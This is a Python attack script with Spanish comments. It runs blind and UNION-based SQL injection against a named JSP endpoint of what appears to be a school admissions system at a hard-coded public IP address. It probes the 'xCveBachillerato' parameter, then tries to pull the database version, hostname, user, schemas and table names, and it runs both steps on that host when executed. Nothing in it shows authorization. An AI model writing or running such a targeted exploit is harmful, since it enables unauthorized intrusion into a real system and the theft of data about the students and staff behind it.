import requests
import time

class SQLInjector:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
    
    def blind_sql_injection(self):
        """SQL Injection ciega para extraer datos"""
        print("[+] Probando SQL Injection ciega...")
        
        # Endpoint conocido que muestra datos
        endpoint = "/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp"
        
        # Payloads para identificar vulnerabilidad
        test_payloads = [
            "1",  # Normal
            "1'",  # Error
            "1' AND '1'='1",  # True
            "1' AND '1'='2",  # False
            "1' OR '1'='1'-- ",  # Always true
            "1' UNION SELECT 1,2,3-- "  # Union
        ]
        
        for payload in test_payloads:
            url = f"{self.target}{endpoint}?xCveBachillerato={payload}"
            try:
                response = self.session.get(url)
                print(f"Payload: {payload[:20]}... -> Status: {response.status_code}, Tamaño: {len(response.text)}")
                
                if response.status_code == 200 and len(response.text) > 10:
                    print(f"Respuesta: {response.text[:100]}...")
                    
            except Exception as e:
                print(f"Error: {e}")
    
    def extract_database_info(self):
        """Intentar extraer información de la base de datos"""
        print("\n[+] Extrayendo información de BD...")
        
        # Payloads para MySQL
        payloads = [
            "1' UNION SELECT @@version,@@hostname,user()-- ",
            "1' UNION SELECT database(),schema_name,3 FROM information_schema.schemata-- ",
            "1' UNION SELECT table_name,table_schema,3 FROM information_schema.tables WHERE table_schema=database()-- "
        ]
        
        for payload in payloads:
            url = f"{self.target}/jsp/escolar/proceso_admision/muestra_bachillerato_ajax.jsp?xCveBachillerato={payload}"
            try:
                response = self.session.get(url)
                if response.status_code == 200:
                    print(f"Payload: {payload[:30]}...")
                    print(f"Respuesta: {response.text}")
            except Exception as e:
                print(f"Error: {e}")

# Ejecutar
injector = SQLInjector("http://189.254.143.102")
injector.blind_sql_injection()
injector.extract_database_info()